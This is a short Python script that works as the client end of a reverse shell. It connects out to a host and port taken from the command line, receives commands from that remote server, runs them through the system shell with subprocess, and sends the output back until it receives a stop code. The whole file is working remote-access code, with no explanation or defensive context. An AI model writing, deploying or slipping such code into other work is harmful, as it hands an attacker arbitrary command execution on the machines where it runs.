import socket
import subprocess
import sys

SERVER = sys.argv[1]
PORT = int(sys.argv[2])


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((SERVER, PORT))

while True:
    buff_size = int(s.recv(1024).decode())
    cmd = s.recv(buff_size).decode()
    if cmd == '000':
        break
    print(f'To execute: {cmd.split()}')

    output = subprocess.check_output(cmd.split(), shell=True).decode()
    # print(type(output))
    output_buffer = str(len(output))

    s.send(output_buffer.encode())
    s.send(output.encode())
